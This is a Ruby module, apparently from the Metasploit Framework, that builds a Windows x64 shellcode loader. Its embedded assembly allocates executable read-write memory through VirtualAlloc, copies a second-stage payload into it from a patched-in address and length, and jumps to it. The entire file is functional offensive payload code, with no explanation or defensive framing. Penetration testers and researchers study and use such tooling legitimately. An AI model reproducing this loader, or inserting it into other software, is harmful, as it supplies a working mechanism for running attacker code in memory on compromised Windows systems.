# -*- coding: binary -*-

module Msf

###
#
# Windows ARCH_X64 loader
#
###

module Payload::Windows::AddrLoader_x64

  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi_x64

  #
  # Generate and compile the loader
  #
  def generate_loader
    combined_asm = %Q^
        cld                    ; Clear the direction flag.
        and rsp, ~0xF          ;  Ensure RSP is 16 byte aligned
        call start             ; Call start, this pushes the address of 'api_call' onto the stack.
        #{asm_block_api}
      start:
        pop rbp
        #{asm_block_loader}
    ^
    loader = Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
    offset_size = loader.index("AAAAAAAA")
    offset_addr = loader.index("BBBBBBBB")
    [ loader, offset_addr, offset_size ]
  end

  def asm_block_loader
    asm = %Q^
        call after_len          ; Call after_addr, this pushes the length onto the stack
        db 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41
      after_len:
        pop rsi                 ; RSI = len
        mov rsi, [rsi]

        mov esi, esi            ; only use the lower-order 32 bits for the size
        push 0x40               ;
        pop r9                  ; PAGE_EXECUTE_READWRITE
        push 0x1000             ;
        pop r8                  ; MEM_COMMIT
        mov rdx, rsi            ; the newly recieved second stage length.
        xor rcx, rcx            ; NULL as we dont care where the allocation is.
        mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        ; Receive the second stage and execute it...
        mov rbx, rax            ; rbx = our new memory address for the new stage
        mov r15, rax            ; save the address so we can jump into it later

        call after_addr         ; Call after_addr, this pushes the address onto the stack.
        db 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42
      after_addr:
        pop rdi                 ; EDI = addr
        mov rdi, [rdi]

      copy_memory:
        mov rdx, [rdi]
        mov [rbx], rdx
        add rbx, 8
        add rdi, 8
        sub rsi, 8
        test rsi,rsi
        jnz copy_memory

      execute_stage:
        jmp r15                 ; dive into the stored stage address

    ^
    asm
  end

end

end
